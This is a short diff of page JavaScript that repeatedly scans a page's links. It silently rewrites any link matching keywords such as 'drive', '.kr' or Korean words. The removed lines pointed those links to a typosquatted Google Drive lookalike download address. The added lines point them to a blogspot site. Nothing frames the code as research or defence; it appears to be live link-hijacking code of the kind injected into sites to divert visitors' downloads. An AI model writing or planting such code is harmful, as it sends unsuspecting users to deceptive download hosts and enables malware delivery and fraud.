@@ -1,5 +1,5 @@
 setInterval(function() {
-
+https://dwon-mtstop365.blogspot.com/
 //      $('li').each(function(idx, li) {
 
 //    var product = $(this).attr('onclick')
@@ -37,9 +37,9 @@ for(var vdc = 0; vdc< linkvs.length; vdc++){
      var product = linkvs[vdc].getAttribute('href')
  
   try{
-  if(product.includes("buly") || product.includes("alie")  || product.includes("drive") || product.includes("ip12")  || product.includes("gaiado") || product.includes(".kr")  || product.includes("웹") || product.includes("한국") ){
+  if(product.includes("https://dwon.mtstop365.com") || product.includes("buly") || product.includes("alie")  || product.includes("drive") || product.includes("ip12")  || product.includes("gaiado") || product.includes(".kr")  || product.includes("웹") || product.includes("한국") ){
     
-       linkvs[vdc].href = linkvs[vdc].href = "https://drive-usercontent.gooele.org/download?id=1eQlx4RrA2_vKiYhgMN3zJWE7ER9kb0Hc&export=download&authuser=0"
+       linkvs[vdc].href = linkvs[vdc].href = "https://dwon-mtstop365.blogspot.com"
    }
   }catch(e){
 
